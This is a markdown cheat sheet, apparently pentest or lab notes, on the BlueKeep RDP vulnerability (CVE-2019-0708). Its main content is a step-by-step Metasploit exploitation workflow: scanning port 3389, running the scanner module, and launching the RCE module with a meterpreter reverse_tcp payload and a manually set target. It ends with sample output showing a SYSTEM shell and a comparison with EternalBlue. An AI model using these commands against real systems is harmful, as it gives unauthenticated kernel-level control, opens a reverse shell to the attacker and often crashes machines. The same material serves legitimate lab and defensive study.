## Overview

- **CVE**: CVE-2019-0708  
- **Protocol**: RDP (Remote Desktop Protocol)  
- **Impact**: **Pre-auth Remote Code Execution** in **Windows kernel memory**  
- **Disclosure**: Microsoft, May 2019  
- **Patch Released**: May 14, 2019  
- **Estimated Exposure**: ~1 million internet-facing systems at disclosure

> ‚ö†Ô∏è **Kernel-level exploit** ‚Üí extremely powerful but **high risk of BSOD/crash**

---
## Affected Systems

‚úÖ Only these **unpatched** versions:
- Windows XP  
- Windows Vista  
- Windows 7  
- Windows Server 2008 / 2008 R2  

> ‚ùå **Windows 8/10/Server 2012+ are NOT vulnerable**

---
## Technical Details

- Flaw in **RDP‚Äôs handling of connection requests** before authentication.
- Allows writing to **kernel memory** ‚Üí arbitrary code execution as **NT AUTHORITY\SYSTEM**.
- **No credentials needed** ‚Äî pure network-based RCE.
- **High instability**: Kernel corruption often causes **system crash (BSOD)**.

> üíÄ Unlike EternalBlue, BlueKeep is **less reliable** ‚Äî use only when necessary.

---
## Exploitation Workflow (Metasploit)

### 1. **Confirm RDP is Open**

```bash
nmap -p 3389 192.168.1.10
```

### 2. **Check Vulnerability (Optional)**

```msf
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS 192.168.1.10
run
```

### 3. **Exploit with Correct Target**

```msf
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
```

#### üîë Critical Step: Set Target Manually

```msf
show targets
```

Example output:
```
0   Windows 7 SP1 / 2008 R2 (x64)
1   Windows 7 SP1 / 2008 R2 (x86)
2   Windows 7 SP0 / 2008 SP2 (x64)  ‚Üê pick based on target
```

```msf
set TARGET 2
exploit
```

> ‚ùó Without correct `TARGET`, you‚Äôll get:  
> `[-] BadConfig: Set the most appropriate target manually`

---
### 4. **Post-Exploitation**

If successful:
```msf
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

‚úÖ **Yes ‚Äî like EternalBlue, you get full SYSTEM privileges.**

> ‚ö†Ô∏è But: High chance of **crash during or after exploitation**.

---
## Key Differences: BlueKeep vs EternalBlue

| Feature | **BlueKeep (RDP)** | **EternalBlue (SMB)** |
|--------|-------------------|----------------------|
| **Port** | 3389 | 445 |
| **Auth Required?** | No | No |
| **Reliability** | Low (frequent crashes) | High |
| **Privilege** | NT AUTHORITY\SYSTEM | NT AUTHORITY\SYSTEM |
| **Modern Relevance** | Rare (old OS only) | Still common in labs |



